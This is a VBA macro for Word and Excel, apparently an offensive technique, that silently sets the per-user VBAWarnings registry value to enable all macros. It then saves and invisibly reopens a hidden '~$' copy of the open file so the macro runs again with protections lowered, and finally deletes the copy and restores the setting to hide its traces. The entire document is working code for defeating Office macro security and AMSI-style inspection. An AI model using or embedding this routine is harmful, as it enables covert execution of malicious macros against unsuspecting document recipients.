Sub EnableAllMacros_AMSI()
    Dim dwErrorCode As Long
    Dim szSourceFileFullPathName As String
    
    Dim szSecurityKey As String
    Dim hSubKey As LongPtr
    Dim szDestinationName As String
    Dim szDestinationFileFullPathName As String
    Dim dwOriginalWarningLevel As Long
    Dim dwNewWarningLevel As Long

    Application.DisplayAlerts = False
    

    If InStr(Application.Name, "Word") <> 0 Then

        If InStr(ActiveDocument.Name, "~$") = 0 Then
            szSourceFileFullPathName = ActiveDocument.Path & Application.PathSeparator & ActiveDocument.Name
            szDestinationName = "~$" & Mid(ActiveDocument.Name, 3)
            szDestinationFileFullPathName = ActiveDocument.Path & Application.PathSeparator & szDestinationName
            szSecurityKey = "Software\Microsoft\Office\" & Application.Version & "\Word\Security"
            
            dwErrorCode = m_RegOpenKeyEx(HKEY_CURRENT_USER, szSecurityKey, 0, KEY_READWRITE, hSubKey)
            If dwErrorCode <> ERROR_SUCCESS Then
                End
            End If
        
            dwErrorCode = m_RegQueryValueEx(hSubKey, "VBAWarnings", 0, REG_DWORD, dwOriginalWarningLevel, 4)
            If dwErrorCode <> ERROR_SUCCESS Then
                dwOriginalWarningLevel = 2
            End If
            
            dwNewWarningLevel = 1
            dwErrorCode = m_RegSetValueEx(hSubKey, "VBAWarnings", 0, REG_DWORD, dwNewWarningLevel, 4)
            If dwErrorCode <> ERROR_SUCCESS Then
                End
            End If
    
            ActiveDocument.SaveAs2 FileName:=szDestinationFileFullPathName, FileFormat:=wdFormatXMLDocumentMacroEnabled
            ActiveDocument.SaveAs2 FileName:=szSourceFileFullPathName, FileFormat:=wdFormatXMLDocumentMacroEnabled
            
            Documents.Open FileName:=szDestinationFileFullPathName, Visible:=False
            
            Documents(szDestinationFileFullPathName).Close wdDoNotSaveChanges
            
            Kill szDestinationFileFullPathName
            
            m_RegSetValueEx hSubKey, "VBAWarnings", 0, REG_DWORD, dwOriginalWarningLevel, 4
            
            m_RegCloseKey hSubKey
                
            End
        End If
    ElseIf InStr(Application.Name, "Excel") <> 0 Then
    
        If InStr(ActiveWorkbook.Name, "~$") = 0 Then
        
            szSourceFileFullPathName = ActiveWorkbook.Path & Application.PathSeparator & ActiveWorkbook.Name
            szDestinationName = "~$" & Mid(ActiveWorkbook.Name, 3)
            szDestinationFileFullPathName = ActiveWorkbook.Path & Application.PathSeparator & szDestinationName
            szSecurityKey = "Software\Microsoft\Office\" & Application.Version & "\Excel\Security"
            
            dwErrorCode = m_RegOpenKeyEx(HKEY_CURRENT_USER, szSecurityKey, 0, KEY_READWRITE, hSubKey)
            If dwErrorCode <> ERROR_SUCCESS Then
                End
            End If
        
            dwErrorCode = m_RegQueryValueEx(hSubKey, "VBAWarnings", 0, REG_DWORD, dwOriginalWarningLevel, 4)
            If dwErrorCode <> ERROR_SUCCESS Then
                dwOriginalWarningLevel = 2
            End If
            
            dwNewWarningLevel = 1
            dwErrorCode = m_RegSetValueEx(hSubKey, "VBAWarnings", 0, REG_DWORD, dwNewWarningLevel, 4)
            If dwErrorCode <> ERROR_SUCCESS Then
                End
            End If
            
            ActiveWorkbook.SaveCopyAs FileName:=szDestinationFileFullPathName
            
            Workbooks.Open FileName:=szDestinationFileFullPathName
            
            Workbooks(szDestinationName).Close SaveChanges:=False
            
            Kill szDestinationFileFullPathName
            
            m_RegSetValueEx hSubKey, "VBAWarnings", 0, REG_DWORD, dwOriginalWarningLevel, 4
            
            m_RegCloseKey hSubKey
                
            End
        End If
    Else
        End
    End If
       
End Sub
